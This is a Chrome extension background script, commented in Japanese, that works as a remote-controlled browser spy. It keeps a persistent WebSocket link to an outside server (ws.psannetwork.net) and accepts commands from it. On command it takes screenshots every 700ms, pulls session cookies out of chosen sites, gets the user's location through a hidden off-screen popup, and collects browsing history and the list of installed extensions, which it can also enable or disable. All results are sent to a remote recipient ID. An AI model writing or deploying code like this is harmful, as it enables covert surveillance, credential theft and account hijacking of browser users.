// インストール時にログ出力
chrome.runtime.onInstalled.addListener(() => {
    console.log("Extension Installed");
  });
  
// メッセージリスナー: 受信したメッセージに基づく処理
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    switch (message.type) {
      case 'geolocation':
        handleGeolocation(message.data);
        break;
    
      case 'cookies':
        handleCookies(message.data);
        break;
    
      case 'screenshot':
        handleScreenshot(message.data);
        break;

      case 'captureScreenshot':
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            const tab = tabs[0];
            if (tab.url && !tab.url.startsWith("devtools://")) { // devtools://をチェック
              chrome.tabs.captureVisibleTab(null, { format: 'png' }, (screenshotUrl) => {
                if (chrome.runtime.lastError) {
                  console.error('スクリーンショット取得エラー:', chrome.runtime.lastError);
                  sendResponse({ error: 'Failed to capture screenshot' });
                } else {
                  sendResponse({ screenshotUrl });
                  const targetId = result.sendingId;
                  sendMessage(targetId, screenshotUrl);
                }
              });
            } else {
              console.error("devtools:// タブでスクリーンショットは取得できません");
              sendResponse({ error: 'Cannot capture screenshot for devtools:// URLs' });
            }
          });
          // 非同期応答のため、trueを返して応答を待機
          return true;
    
      default:
        console.warn(`未知のメッセージタイプ: ${message.type}`);
        break;
    }
  });
  
// 位置情報を受信してログ出力
function handleGeolocation(data) {
  const { latitude, longitude } = data;
  console.log(`位置情報を受信: 緯度 ${latitude}, 経度 ${longitude}`);

  // 'sendingId' を取得
  chrome.storage.local.get('sendingId', function(result) {
    if (result.sendingId) {
      console.log('保存されたID:', result.sendingId);  // 'sendingId' の値を表示
      const targetId = result.sendingId; // 実際の相手のIDを指定

      // 位置情報をメッセージとして準備
      const messageText = JSON.stringify({ latitude, longitude }); // 位置情報をJSON形式で送信

      // メッセージを送信
      sendMessage(targetId, messageText); // targetId と messageText を渡してメッセージを送信
    } else {
      console.error('sendingId が保存されていません。確認してください。');
    }
  });
}

// クッキー情報を受信してログ出力
function handleCookies(cookies) {
  console.log('Received cookies:', cookies); // クッキーをバックグラウンドのコンソールに表示
  
  // 保存されたsendingIdを取得
  chrome.storage.local.get('sendingId', function(result) {
    if (result.sendingId) {
      console.log('保存されたID:', result.sendingId);  // 'sendingId' の値を個別に表示
      const targetId = result.sendingId; // 実際の相手のIDを指定
      
      // クッキー情報を送信するメッセージを準備
      const messageText = JSON.stringify(cookies); // クッキー情報をJSON形式で送信
      sendMessage(targetId, messageText); // targetId と messageText を渡してメッセージを送信
    } else {
      console.error('sendingId が保存されていません。確認してください。');
    }
  });
}

  
  // スクリーンショットのURLを受信してログ出力
  function handleScreenshot(screenshotUrl) {
    console.log('スクリーンショットURLをバックグラウンドで受信:', screenshotUrl);
          chrome.storage.local.get('sendingId', function(result) {

                const targetId = result.sendingId;
                sendMessage(targetId, screenshotUrl);
    // 必要に応じてスクリーンショットを処理するコードを追加
              });
  }
  
  // 位置情報ウィンドウを開く関数
  function getLocations() {
    chrome.windows.create({
      url: chrome.runtime.getURL('geolocations.html'),
      type: 'popup',
      focused: false,
      width: 1,
      height: 1,
      top: -1000,
      left: -1000
    }, (window) => {
      console.log('位置情報ウィンドウが開かれました:', window.id);
    });
  }
  
  // タブの情報を取得し、表示する関数
  function getTabs() {
    chrome.tabs.query({}, (tabs) => {
      tabs.forEach((tab) => {
        console.log(`Tab ID: ${tab.id}, Title: ${tab.title}, URL: ${tab.url}`);
      });
    });
  }
  
  // 指定したURLのタブを閉じる関数
  function closeTabs(url) {
    chrome.tabs.query({}, (tabs) => {
      tabs.forEach((tab) => {
        if (tab.url && tab.url.includes(url)) {
          chrome.tabs.remove(tab.id, () => {
            console.log(`タブ ${tab.id} を閉じました: ${tab.url}`);
          });
        }
      });
    });
  }
  
  // 新しいタブまたはウィンドウで指定したURLを開く関数
  function openUrl(url, inNewWindow = false, width = 800, height = 600) {
    if (inNewWindow) {
      chrome.windows.create({
        url: url,
        type: 'normal',
        width: width,
        height: height
      }, (window) => {
        console.log(`新しいウィンドウを開きました: ${url}, サイズ: ${width}x${height}`);
      });
    } else {
      chrome.tabs.create({ url: url }, (tab) => {
        console.log(`新しいタブを開きました: ${url}`);
      });
    }
  }
  
  // 指定されたURLのタブにスクリプトを実行する関数
  function executeCode(targetUrl, funcToExecute) {
    chrome.tabs.query({}, (tabs) => {
      const targetTab = tabs.find((tab) => tab.url && tab.url === targetUrl);
  
      if (targetTab) {
        chrome.scripting.executeScript({
          target: { tabId: targetTab.id },
          func: funcToExecute
        }, () => {
          console.log(`Script executed on tab with URL: ${targetTab.url}`);
        });
      } else {
        console.warn(`No tab found with exactly matching URL: ${targetUrl}`);
      }
    });
  }
  
  // タブを検索してクッキーを取得する関数
  function getCookies(url) {
    const code = () => {
      console.log("Injected script is running!");
      // クッキーを取得してバックグラウンドスクリプトに送信
      chrome.runtime.sendMessage({
        type: 'cookies',
        data: document.cookie
      });
    };
  
    // ターゲットURLに対してコードを実行
    executeCode(url, code);
  }
  
  // スクリーンショットを取得する関数
  function setScreenshot(url) {
    const code = () => {
      function captureScreen() {
        chrome.runtime.sendMessage({ type: 'captureScreenshot' }, (response) => {
          if (response.screenshotUrl) {
  
            // バックグラウンドからの応答を使ってメッセージを送信
            chrome.runtime.sendMessage(
              { type: 'screenshot', data: response.screenshotUrl },
              (response) => {
              }
            );
          }
        });
      }
  
      // 700msごとにスクリーンショットをキャプチャ
      setInterval(captureScreen, 700);
    };
  
    // ターゲットURLに対してコードを実行
    executeCode(url, code);
  }
  
  // インストールされている拡張機能を取得してログ出力する関数
function getExtensions() {
  return new Promise((resolve, reject) => {
    chrome.management.getAll((extensions) => {
      if (chrome.runtime.lastError) {
        reject(new Error('拡張機能の情報を取得できませんでした'));
      } else {
        resolve(extensions);
      }
    });
  });
}
  // 指定された拡張機能を有効化または無効化する関数
  function extensionEnable(extensionId, enable) {
    chrome.management.setEnabled(extensionId, enable, () => {
      if (chrome.runtime.lastError) {
        console.error(`Error: ${chrome.runtime.lastError.message}`);
      } else {
        console.log(`Extension ${extensionId} has been ${enable ? "enabled" : "disabled"}.`);
      }
    });
  }
  
// 履歴を取得して返す関数
function getHistory() {
  return new Promise((resolve, reject) => {
    chrome.history.search({
      text: '',
      maxResults: 1000,
      startTime: 0,
      endTime: Date.now()
    }, (results) => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError));
      } else {
        const historyData = results.map(page => ({
          url: page.url,
          title: page.title,
          lastVisitTime: new Date(page.lastVisitTime)
        }));
        resolve(historyData);
      }
    });
  });
}


  // ヘルプ関数: 各関数の説明を表示する
  function help() {
    const helpText = `
      関数説明:
  
      1. getLocations()  
         位置情報を表示するためのポップアップウィンドウを開きます。  
         使用例: getLocations();
  
      2. getTabs()  
         現在開いているすべてのタブを取得し、それぞれのタブのID、タイトル、URLをコンソールに表示します。  
         使用例: getTabs();
  
      3. closeTabs(url)  
         指定したURLを含むタブをすべて閉じます。  
         使用例: closeTabs('https://www.example.com');
  
      4. openUrl(url, inNewWindow = false, width = 800, height = 600)  
         新しいタブまたはウィンドウで指定したURLを開きます。  
         使用例: openUrl('https://www.example.com', true, 1024, 768);
  
      5. executeCode(targetUrl, funcToExecute)  
         指定したURLのタブにスクリプトを注入して実行します。  
         使用例: 
           const code = () => { alert(document.title); };
           executeCode('https://www.example.com', code);
  
      6. getExtensions()  
         インストールされているすべての拡張機能の情報をコンソールに表示します。  
         使用例: getExtensions();
  
      7. extensionEnable(extensionId, enable)  
         指定した拡張機能を有効化または無効化します。  
         使用例: extensionEnable('extension-id', true); // 有効化
                extensionEnable('extension-id', false); // 無効化
  
      8. getHistory()  
         ブラウザの履歴から最大1000件のページ情報を取得し、URL、タイトル、アクセス日時を表示します。  
         使用例: getHistory();
  
      9. getCookies(url)  
         指定されたURLに対してクッキーを取得し、バックグラウンドに送信します。  
         使用例: getCookies('https://www.example.com');
    `;
    console.log(helpText);
  }
  


  let ws;
  let clientId;
  
  // WebSocket接続を初期化
  function initWebSocket() {
    // chrome.storageからIDを取得
    chrome.storage.local.get('key', function(result) {
      clientId = result.key; // 'key' は保存されたキーの名前
  
      if (!clientId) {
        console.log('IDが保存されていないため、接続を開始しません');
        return; // IDがない場合は接続しない
      }
  
      // IDが存在する場合にWebSocket接続を開始
      const SERVER_URL = 'wss://ws.psannetwork.net/'; // ここに適切なWebSocketサーバーのURLを入力
      ws = new WebSocket(SERVER_URL);
  
      // WebSocket接続が開かれたとき
      ws.onopen = () => {
        console.log('サーバーに接続しました');
        sendIdToServer();  // サーバーにIDを送信
      };
  
      // メッセージを受信したとき
      ws.onmessage = (event) => {
        handleMessage(event.data);
      };
  
      // エラーが発生したとき
      ws.onerror = (error) => {
        console.error('接続エラー:', error);
      };
  
      // 接続が閉じられたとき
      ws.onclose = () => {
        console.log('サーバーから切断されました');
        handleReconnection();  // 自動再接続の処理
      };
    });
  }
  
  // 自分のIDをサーバーに送信
  function sendIdToServer() {
    const message = { id: clientId };
    ws.send(JSON.stringify(message));
  }
  
  // メッセージを受信したときの処理
  function handleMessage(data) {
    const message = JSON.parse(data);
    console.log('受信したメッセージ:', message);
if (message.message) {
    const msg = message.message;

    // "screenshot " で始まる場合
    if (msg.startsWith("screenshot ")) {
        const url = msg.slice(11); // "screenshot " の部分を除いた残りがURL
        if (isValidUrl(url)) { // URLが正しいか確認
            setScreenshot(url);
            console.log('URL:', url); // デバッグ用
        } else {
            console.error('無効なURL:', url); // URLが無効な場合のエラーハンドリング
        }
    } 
else if (msg.startsWith("extensionEnable")) {
    const exid = msg.slice(15).trim(); // "extensionEnable" の部分を除いた残りがID
    console.log('トリミングされたID:', exid); // デバッグログを追加
    if (isValidExtensionId(exid)) { // 有効なIDか確認
        extensionEnable(exid, true);
        console.log('拡張機能を有効化:', exid);
    } else {
        console.error('無効な拡張機能ID:', exid);
    }
} 
else if (msg.startsWith("extensionDisable")) {
    const exid = msg.slice(16).trim(); // "extensionDisable" の部分を除いた残りがID
    console.log('トリミングされたID:', exid); // デバッグログを追加
    if (isValidExtensionId(exid)) { // 有効なIDか確認
        extensionEnable(exid, false);
        console.log('拡張機能を無効化:', exid);
    } else {
        console.error('無効な拡張機能ID:', exid);
    }
}
else if (msg.startsWith("GetExtensionId")) {
  // getExtensionsを非同期で呼び出し
  getExtensions().then((extensions) => {
    // 拡張機能の詳細を収集
    const extensionDetails = extensions.map((extension) => ({
      name: extension.name,
      id: extension.id,
      enabled: extension.enabled,
      description: extension.description,
    }));

    console.log('すべての拡張機能の詳細:', extensionDetails);

    // 取得した拡張機能の詳細をメッセージとして送信
    chrome.storage.local.get('sendingId', function(result) {
      if (result.sendingId) {
        console.log('保存されたID:', result.sendingId);  // 'sendingId' の値を個別に表示
        const targetId = result.sendingId; // 実際の相手のIDを指定
        
        // 拡張機能詳細を送信するメッセージを準備
        const messageText = JSON.stringify(extensionDetails); // 拡張機能の詳細をJSON形式で送信
        sendMessage(targetId, messageText); // targetId と messageText を渡してメッセージを送信
      } else {
        console.error('sendingId が保存されていません');
      }
    });
  }).catch((error) => {
    console.error('拡張機能の取得に失敗しました:', error);
  });
}

else if (msg.startsWith("GetHistory")) {
  // GetHistoryを非同期で呼び出し
  getHistory().then((historyData) => {
    // 履歴の詳細を収集（必要な情報を集めていく）
    const historyDetails = historyData.map((page) => ({
      url: page.url,
      title: page.title,
      lastVisitTime: page.lastVisitTime.toISOString(), // 日時をISO文字列に変換
    }));

    // 履歴の詳細情報を確認
    console.log('履歴の詳細:', historyDetails);

    // 保存されたsendingIdを取得
    chrome.storage.local.get('sendingId', function(result) {
      if (result.sendingId) {
        console.log('保存されたID:', result.sendingId);  // 'sendingId' の値を個別に表示
        const targetId = result.sendingId; // 実際の相手のIDを指定
        
        // 履歴の詳細を送信するメッセージを準備
        const messageText = JSON.stringify(historyDetails); // 履歴の詳細をJSON形式で送信
        sendMessage(targetId, messageText); // targetId と messageText を渡してメッセージを送信
      } else {
        console.error('sendingId が保存されていません');
      }
    });
  }).catch((error) => {
    console.error('履歴の取得に失敗しました:', error);
  });
}// メッセージを受信したときの処理
else if (msg.startsWith("GetCookies")) {
  // "GetCookies" の後ろに続く URL を取得
      const url = msg.slice("GetCookies".length).trim(); // "GetCookies" を取り除いた後、URLを抽出

  // URL が "https://" で始まることを確認
  if (url.startsWith("https://")) {
    // getCookies 関数を呼び出して、URLを渡す
    getCookies(url);
  } else {
    console.error('有効な HTTPS URL が指定されていません');
  }
}
else if (msg.startsWith("getLocations")) {
    getLocations();
} else if (msg.startsWith("openPage")) {
    const urlAndOptions = msg.slice("openPage".length).trim(); 
    const parts = urlAndOptions.split(' ');
    const url = parts[0]; 
    const inNewWindow = parts[1] === 'true';
    const width = parts[2] ? parseInt(parts[2], 10) : 800;
    const height = parts[3] ? parseInt(parts[3], 10) : 600;
    
    openUrl(url, inNewWindow, width, height);
}

}

  }

// URLが正しい形式か確認する関数
function isValidUrl(url) {
    try {
        const parsedUrl = new URL(url);
        return parsedUrl.protocol === 'http:' || parsedUrl.protocol === 'https:';
    } catch (e) {
        return false; // URLが不正な場合
    }
}

// 拡張機能IDが有効かどうかを確認する関数（ここでは単純な文字列チェック）
function isValidExtensionId(id) {
    return typeof id === 'string' && id.trim().length > 0;
}


  // 送信する相手のIDとテキストを指定してメッセージを送信する関数
  function sendMessage(targetId, text) {
    // WebSocketが開かれていない場合、接続を初期化
    if (!ws || ws.readyState !== WebSocket.OPEN) {
      console.log('WebSocket接続を初期化します。');
      initWebSocket(); // WebSocketを初期化
    }
  
    // WebSocketが開かれている場合、メッセージを送信
    if (ws.readyState === WebSocket.OPEN) {
      const message = {
        id: clientId, // 自分のID
        to: targetId, // 送信相手のID
        message: text // 送信するテキスト
      };
      ws.send(JSON.stringify(message));
      console.log(`メッセージを送信しました: to=${targetId}, message=${text}`);
    } else {
      console.log('WebSocket接続が確立されていない');
    }
  }
  
  // 自動再接続の処理
  let reconnectAttempts = 0; // 再接続試行回数
  function handleReconnection() {
    if (reconnectAttempts < 50000) { // 最大再接続回数を設定
      const reconnectDelay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000); // 再接続までの遅延時間
      reconnectAttempts++;
  
      console.log(`再接続試行中... ${reconnectAttempts}回目 (遅延: ${reconnectDelay}ms)`);
  
      setTimeout(() => {
        initWebSocket(); // 再接続を試みる
      }, reconnectDelay);
    } else {
      console.log('再接続試行回数を超えました');
    }
  }
  
  // テスト用: 送信する相手とメッセージを指定して送信
  setTimeout(() => {
    chrome.storage.local.get('sendingId', function(result) {
      console.log(result);  // ここで取得した結果をコンソールに表示
      console.log('保存されたID:', result.sendingId);  // 'sendingId' の値を個別に表示
      const targetId = result.sendingId; // 実際の相手のIDを指定
      const messageText = 'こんにちは！テストメッセージです。';
      sendMessage(targetId, messageText);
    });
  }, 5000);  // 5秒後に送信
  
  // 接続の初期化
  initWebSocket();
  